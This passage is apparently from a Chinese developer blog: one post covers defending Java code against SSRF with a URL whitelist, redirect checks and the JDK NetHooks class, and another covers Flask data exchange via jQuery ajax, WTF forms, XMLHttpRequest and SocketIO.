+1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * 定义要在绑定或连接TCP套接字之前调用的静态方法。 */public final class NetHooks &#123;    /**     * 带钩子的提供者，允许在绑定或连接TCP套接字之前转换套接字。     *     * &lt;p&gt; 这个类的具体实现应该定义一个零参数构造函数，并实现下面指定的抽象方法。     */    public static abstract class Provider &#123;        /**         *初始化该类的新实例。         */        protected Provider() &#123;&#125;        /**         *在绑定TCP套接字之前调用。         */        public abstract void implBeforeTcpBind(FileDescriptor fdObj,                                               InetAddress address,                                               int port)            throws IOException;        /**         *在连接未绑定的TCP套接字之前调用。         */        public abstract void implBeforeTcpConnect(FileDescriptor fdObj,                                                 InetAddress address,                                                 int port)            throws IOException;    &#125;    /**     * 现在，我们在Solaris上加载SDP provider。将来，这可能会被更改为使用ServiceLoader工具，以允许部署其他提供者。     */    private static final Provider provider = new sun.net.sdp.SdpProvider();    /**     * 在绑定TCP套接字之前调用。     */    public static void beforeTcpBind(FileDescriptor fdObj,                                     InetAddress address,                                     int port)        throws IOException    &#123;        provider.implBeforeTcpBind(fdObj, address, port);    &#125;    /**     * 在连接未绑定的TCP套接字之前调用。     */    public static void beforeTcpConnect(FileDescriptor fdObj,                                        InetAddress address,                                        int port)        throws IOException    &#123;        provider.implBeforeTcpConnect(fdObj, address, port);    &#125;&#125;
+
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="1、Java代码中的SSRF触发点"><a href="#1、Java代码中的SSRF触发点" class="headerlink" title="1、Java代码中的SSRF触发点"></a>1、Java代码中的SSRF触发点</h2><p>SSRF的产生需要满足两个点：1. 接收外部传入的地址，2.发送请求。</p>
+<p>URL<br>HttpClient<br>HttpURLConnection<br>ImageIO<br>DriverManager<br>Socket<br>OkHttpClient<br>……</p>
+<h2 id="2、如何防御SSRF攻击"><a href="#2、如何防御SSRF攻击" class="headerlink" title="2、如何防御SSRF攻击"></a>2、如何防御SSRF攻击</h2><h3 id="2-1-白名单判断"><a href="#2-1-白名单判断" class="headerlink" title="2.1 白名单判断"></a>2.1 白名单判断</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class SSRFWhiteChecker extends WhiteChecker &#123;</span><br><span class="line">    private static SSRFWhiteChecker instance = null;</span><br><span class="line"></span><br><span class="line">    public SSRFWhiteChecker()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static SSRFWhiteChecker getInstance() &#123;</span><br><span class="line">        if (null == instance) &#123;</span><br><span class="line">            synchronized (SSRFWhiteChecker.class) &#123;</span><br><span class="line">                if (null == instance) &#123;</span><br><span class="line">                    instance = new SSRFWhiteChecker();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @Description: 校验url是否在白名单内</span><br><span class="line">     * @Param: url 网络地址</span><br><span class="line">     * @return: boolean true 在白名单内；false 不在白名单内</span><br><span class="line">     */</span><br><span class="line">    public boolean verifyURL(String url)&#123;</span><br><span class="line">        return super.verifyURL(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-防止重定向绕过"><a href="#2-2-防止重定向绕过" class="headerlink" title="2.2 防止重定向绕过"></a>2.2 防止重定向绕过</h3><p>对每次跳转都进行判断</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<h3 id="2-3-利用NetHooks实现TCP请求前置判断"><a href="#2-3-利用NetHooks实现TCP请求前置判断" class="headerlink" title="2.3 利用NetHooks实现TCP请求前置判断"></a>2.3 利用NetHooks实现TCP请求前置判断</h3><p>通过sun.net.NetHooks实现拦截TCP请求，进行host判断。</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>该类的方法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 定义要在绑定或连接TCP套接字之前调用的静态方法。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public final class NetHooks &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 带钩子的提供者，允许在绑定或连接TCP套接字之前转换套接字。</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt; 这个类的具体实现应该定义一个零参数构造函数，并实现下面指定的抽象方法。</span><br><span class="line">     */</span><br><span class="line">    public static abstract class Provider &#123;</span><br><span class="line">        /**</span><br><span class="line">         *初始化该类的新实例。</span><br><span class="line">         */</span><br><span class="line">        protected Provider() &#123;&#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         *在绑定TCP套接字之前调用。</span><br><span class="line">         */</span><br><span class="line">        public abstract void implBeforeTcpBind(FileDescriptor fdObj,</span><br><span class="line">                                               InetAddress address,</span><br><span class="line">                                               int port)</span><br><span class="line">            throws IOException;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         *在连接未绑定的TCP套接字之前调用。</span><br><span class="line">         */</span><br><span class="line">        public abstract void implBeforeTcpConnect(FileDescriptor fdObj,</span><br><span class="line">                                                 InetAddress address,</span><br><span class="line">                                                 int port)</span><br><span class="line">            throws IOException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 现在，我们在Solaris上加载SDP provider。将来，这可能会被更改为使用ServiceLoader工具，以允许部署其他提供者。</span><br><span class="line">     */</span><br><span class="line">    private static final Provider provider = new sun.net.sdp.SdpProvider();</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在绑定TCP套接字之前调用。</span><br><span class="line">     */</span><br><span class="line">    public static void beforeTcpBind(FileDescriptor fdObj,</span><br><span class="line">                                     InetAddress address,</span><br><span class="line">                                     int port)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        provider.implBeforeTcpBind(fdObj, address, port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在连接未绑定的TCP套接字之前调用。</span><br><span class="line">     */</span><br><span class="line">    public static void beforeTcpConnect(FileDescriptor fdObj,</span><br><span class="line">                                        InetAddress address,</span><br><span class="line">                                        int port)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        provider.implBeforeTcpConnect(fdObj, address, port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue May 15 2018 21:00:00 GMT+0800">2018-05-15</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/SSRF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%92%8C%E9%98%B2%E5%BE%A1%E7%AD%96%E7%95%A5%20for%20Java/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Flask%E5%89%8D%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E4%BA%A4%E4%BA%92%E7%9A%84%E5%87%A0%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%96%B9%E5%BC%8F/">
+                        Flask前后端数据交互的几种常见方式
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        前后端数据交互
+jquery ajaxPost方式
+
+获取input value的几种方式：
+12345$(&quot; #name &quot;).val()$(&quot; input[ name=&#x27;name&#x27; ] &quot;).val()$(&quot; input[ type=&#x27;text&#x27; ] &quot;).val()$(&quot; input[ type=&#x27;text&#x27; ]&quot;).attr(&quot;value&quot;)、、、
+
+
+
+坑1：如果没有$(‘#submit’).click(function()动作的话，就只能获取input的预设value，如果没有预设则返回空
+12345678910111213141516171819202122232425&lt;body&gt;&lt;p&gt;jquery ajax&lt;/p&gt;&lt;form id=&quot;form1&quot;&gt;    &lt;input type=&quot;text&quot; id=&quot;name&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;Submit form&quot; id=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt;    $(&#x27;#submit&#x27;).click(function()&#123;        var data=&#123;&#125;        data[&#x27;name&#x27;] = $(&#x27;#name&#x27;).val();        $.ajax(&#123;            type: &#x27;POST&#x27;,            url: &quot;/trans1&quot;,            data: JSON.stringify(data),            contentType: &#x27;application/json; charset=UTF-8&#x27;,            dataType: &#x27;json&#x27;,            success: function(data) &#123;                alert(data)            &#125;,            error: function(xhr, type) &#123;            &#125;        &#125;);    &#125;);&lt;/script&gt;&lt;/body&gt;
+坑2:获取json数据可使用get_json()方法
+12345@app.route(&#x27;/trans1&#x27;, methods=[&#x27;post&#x27;])def trans1():    name = request.get_json(&#x27;name&#x27;)    print(name[&#x27;name&#x27;])    return jsonify(name[&#x27;name&#x27;] + &#x27;233333&#x27;)
+
+
+另一种写法
+坑3:input 的类型只能为button不能为submit只能为button,否则点击button会执行表单action,不会走jquery异步
+12345678&lt;script type=&quot;text/javascript&quot;&gt;    $(&#x27;#submit&#x27;).click(function()&#123;        var data=&#123;&#125;        data[&#x27;name&#x27;] = $(&#x27;#name&#x27;).val();        var url = &quot;/trans1&quot;;        $.post(url,JSON.stringify(data),function(data)&#123;alert(data)&#125;,&#x27;json&#x27;);    &#125;);&lt;/script&gt;
+
+Flask WTF表单
+12345678910111213141516from flask_wtf import Formfrom wtforms import StringField,SubmitFieldfrom wtforms.validators import DataRequiredclass TestForm(Form):    name = StringField(&#x27;name&#x27;, validators=[DataRequired()])    submit = SubmitField(label=&#x27;submit&#x27;)@app.route(&#x27;/wtform&#x27;, methods=[&#x27;get&#x27;,&#x27;post&#x27;])def wtform():    form = TestForm()    name = form.name.data    print(name)    return render_template(&#x27;wtform.html&#x27;, form=form, name=name)
+
+坑4: &#123;&#123;form.hidden_tag()&#125;&#125;是flask防止csrf的机制，在config.py里配置SECRET_KEY = &#39;************&#39;，在view.py中引入app.config.from_pyfile(&#39;config.py&#39;)
+12345678910&lt;body&gt;&lt;form action=&quot;&#123;&#123; url_for(&#x27;wtform&#x27;) &#125;&#125;&quot; method=&quot;post&quot;&gt;    &#123;&#123;form.hidden_tag()&#125;&#125;    &lt;p&gt;        &#123;&#123;form.name&#125;&#125;&lt;br&gt;        &#123;&#123; form.submit &#125;&#125;    &lt;/p&gt;    &lt;p&gt;Hello, &#123;&#123; name &#125;&#125;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;
+
+
+XMLHttpRequestPost
+
+1234567891011121314151617181920212223242526272829&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Practice AJAX&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      function do_ajax() &#123;        var req = new XMLHttpRequest();        var result = document.getElementById(&#x27;result&#x27;);        req.onreadystatechange = function()        &#123;          if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;            result.innerHTML = this.responseText;          &#125; else &#123;            result.innerHTML = &quot;...&quot;;          &#125;        &#125;        req.open(&#x27;POST&#x27;, &#x27;/xmlhttp&#x27;, true);        req.setRequestHeader(&#x27;content-type&#x27;, &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;);        req.send(&quot;name=&quot; + document.getElementById(&#x27;name&#x27;).value);      &#125;    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;form action=&quot;index&quot; method=&quot;post&quot;&gt;      &lt;label&gt;Name:&lt;input type=&quot;text&quot; id=&quot;name&quot; value=&quot;&quot; /&gt;&lt;/label&gt;      &lt;button type=&quot;button&quot; id=&quot;btn-post&quot; onclick=&quot;do_ajax();&quot;&gt;Click&lt;/button&gt;      &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;
+123456@app.route(&#x27;/xmlhttp&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def xmlhttp():    if request.method == &#x27;POST&#x27;:        name = request.form[&#x27;name&#x27;]        return &#x27;hello&#x27; + name    return render_template(&#x27;XMLHttpRequest.html&#x27;)
+
+
+
+WebSocket（Flask-Socketio）
+1234567891011121314151617181920212223242526272829303132333435&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Flask-SocketIO Test&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/socket.io/1.5.1/socket.io.min.js&quot;&gt;&lt;/script&gt;    &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;    $(document).ready(function() &#123;        var socket = io.connect();        socket.on(&#x27;connect&#x27;, function() &#123;            socket.emit(&#x27;connect_event&#x27;, &#123;data: &#x27;connected!&#x27;&#125;);        &#125;)        socket.on(&#x27;server_response&#x27;, function(msg) &#123;            $(&#x27;#log&#x27;).append(&#x27;&lt;br&gt;&#x27; + $(&#x27;&lt;div/&gt;&#x27;).text(&#x27;Received #&#x27; + &#x27;: &#x27; + msg.data).html());        &#125;);        $(&#x27;form#emit&#x27;).submit(function(event) &#123;                socket.emit(&#x27;client_event&#x27;, &#123;data: $(&#x27;#emit_data&#x27;).val()&#125;);                return false;            &#125;);    &#125;);    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;WebSokect&lt;/h2&gt;    &lt;form id=&quot;emit&quot; method=&quot;POST&quot; action=&#x27;#&#x27;&gt;        &lt;input type=&quot;text&quot; name=&quot;emit_data&quot; id=&quot;emit_data&quot; placeholder=&quot;Message&quot;&gt;        &lt;input type=&quot;submit&quot; value=&quot;Echo&quot;&gt;    &lt;/form&gt;    &lt;div id=&#x27;log&#x27;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+
+123456789101112131415161718192021222324252627#!/usr/bin/env pythonfrom flask import Flask, render_template, session, requestfrom flask_socketio import SocketIO, emitapp = Flask(__name__)app.config.from_pyfile(&#x27;config.py&#x27;)socketio = SocketIO(app)@app.route(&#x27;/&#x27;)def index():    return render_template(&#x27;websocket.html&#x27;)@socketio.on(&#x27;client_event&#x27;)def client_msg(msg):    emit(&#x27;server_response&#x27;, &#123;&#x27;data&#x27;: msg[&#x27;data&#x27;]&#125;)@socketio.on(&#x27;connect_event&#x27;)def connected_msg(msg):    emit(&#x27;server_response&#x27;, &#123;&#x27;data&#x27;: msg[&#x27;data&#x27;]&#125;)if __name__ == &#x27;__main__&#x27;:    socketio.run(app, host=&#x27;0.0.0.0&#x27;)
+参考
+源码
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>前后端数据交互</p>
+<h3 id="jquery-ajax"><a href="#jquery-ajax" class="headerlink" title="jquery ajax"></a>jquery ajax</h3><p>Post方式</p>
+<p><img lazyload src="/images/loading.svg" data-src="15244671529959.jpg"></p>
+<p>获取input value的几种方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(&quot; #name &quot;).val()</span><br><span class="line">$(&quot; input[ name=&#x27;name&#x27; ] &quot;).val()</span><br><span class="line">$(&quot; input[ type=&#x27;text&#x27; ] &quot;).val()</span><br><span class="line">$(&quot; input[ type=&#x27;text&#x27; ]&quot;).attr(&quot;value&quot;)</span><br><span class="line">、、、</span><br></pre></td></tr></table></figure>
+
+
+
+<p>坑1：如果没有$(‘#submit’).click(function()动作的话，就只能获取input的预设value，如果没有预设则返回空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;jquery ajax&lt;/p&gt;</span><br><span class="line">&lt;form id=&quot;form1&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;name&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Submit form&quot; id=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    $(&#x27;#submit&#x27;).click(function()&#123;</span><br><span class="line">        var data=&#123;&#125;</span><br><span class="line">        data[&#x27;name&#x27;] = $(&#x27;#name&#x27;).val();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: &#x27;POST&#x27;,</span><br><span class="line">            url: &quot;/trans1&quot;,</span><br><span class="line">            data: JSON.stringify(data),</span><br><span class="line">            contentType: &#x27;application/json; charset=UTF-8&#x27;,</span><br><span class="line">            dataType: &#x27;json&#x27;,</span><br><span class="line">            success: function(data) &#123;</span><br><span class="line">                alert(data)</span><br><span class="line">            &#125;,</span><br><span class="line">            error: function(xhr, type) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>坑2:获取json数据可使用get_json()方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/trans1&#x27;, methods=[&#x27;post&#x27;])</span><br><span class="line">def trans1():</span><br><span class="line">    name = request.get_json(&#x27;name&#x27;)</span><br><span class="line">    print(name[&#x27;name&#x27;])</span><br><span class="line">    return jsonify(name[&#x27;name&#x27;] + &#x27;233333&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+<p>另一种写法</p>
+<p>坑3:input 的类型只能为button不能为submit只能为button,否则点击button会执行表单action,不会走jquery异步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    $(&#x27;#submit&#x27;).click(function()&#123;</span><br><span class="line">        var data=&#123;&#125;</span><br><span class="line">        data[&#x27;name&#x27;] = $(&#x27;#name&#x27;).val();</span><br><span class="line">        var url = &quot;/trans1&quot;;</span><br><span class="line">        $.post(url,JSON.stringify(data),function(data)&#123;alert(data)&#125;,&#x27;json&#x27;);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flask-WTF表单"><a href="#Flask-WTF表单" class="headerlink" title="Flask WTF表单"></a>Flask WTF表单</h3><p><img lazyload src="/images/loading.svg" data-src="15244720433616.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from flask_wtf import Form</span><br><span class="line">from wtforms import StringField,SubmitField</span><br><span class="line">from wtforms.validators import DataRequired</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class TestForm(Form):</span><br><span class="line">    name = StringField(&#x27;name&#x27;, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(label=&#x27;submit&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/wtform&#x27;, methods=[&#x27;get&#x27;,&#x27;post&#x27;])</span><br><span class="line">def wtform():</span><br><span class="line">    form = TestForm()</span><br><span class="line">    name = form.name.data</span><br><span class="line">    print(name)</span><br><span class="line">    return render_template(&#x27;wtform.html&#x27;, form=form, name=name)</span><br></pre></td></tr></table></figure>
+
+<p>坑4: <code>&#123;&#123;form.hidden_tag()&#125;&#125;</code>是flask防止csrf的机制，在config.py里配置<code>SECRET_KEY = &#39;************&#39;</code>，在view.py中引入<code>app.config.from_pyfile(&#39;config.py&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;&#123;&#123; url_for(&#x27;wtform&#x27;) &#125;&#125;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &#123;&#123;form.hidden_tag()&#125;&#125;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123;form.name&#125;&#125;&lt;br&gt;</span><br><span class="line">        &#123;&#123; form.submit &#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;Hello, &#123;&#123; name &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h3><p>Post</p>
+<p><img lazyload src="/images/loading.svg" data-src="15244748295338.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;Practice AJAX&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      function do_ajax() &#123;</span><br><span class="line">        var req = new XMLHttpRequest();</span><br><span class="line">        var result = document.getElementById(&#x27;result&#x27;);</span><br><span class="line">        req.onreadystatechange = function()</span><br><span class="line">        &#123;</span><br><span class="line">          if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">            result.innerHTML = this.responseText;</span><br><span class="line">          &#125; else &#123;</span><br><span class="line">            result.innerHTML = &quot;...&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.open(&#x27;POST&#x27;, &#x27;/xmlhttp&#x27;, true);</span><br><span class="line">        req.setRequestHeader(&#x27;content-type&#x27;, &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;);</span><br><span class="line">        req.send(&quot;name=&quot; + document.getElementById(&#x27;name&#x27;).value);</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;index&quot; method=&quot;post&quot;&gt;</span><br><span class="line">      &lt;label&gt;Name:&lt;input type=&quot;text&quot; id=&quot;name&quot; value=&quot;&quot; /&gt;&lt;/label&gt;</span><br><span class="line">      &lt;button type=&quot;button&quot; id=&quot;btn-post&quot; onclick=&quot;do_ajax();&quot;&gt;Click&lt;/button&gt;</span><br><span class="line">      &lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/xmlhttp&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def xmlhttp():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        name = request.form[&#x27;name&#x27;]</span><br><span class="line">        return &#x27;hello&#x27; + name</span><br><span class="line">    return render_template(&#x27;XMLHttpRequest.html&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="WebSocket（Flask-Socketio）"><a href="#WebSocket（Flask-Socketio）" class="headerlink" title="WebSocket（Flask-Socketio）"></a>WebSocket（Flask-Socketio）</h3><p><img lazyload src="/images/loading.svg" data-src="15244774374724.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Flask-SocketIO Test&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/jquery/3.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&quot;//cdn.bootcss.com/socket.io/1.5.1/socket.io.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; 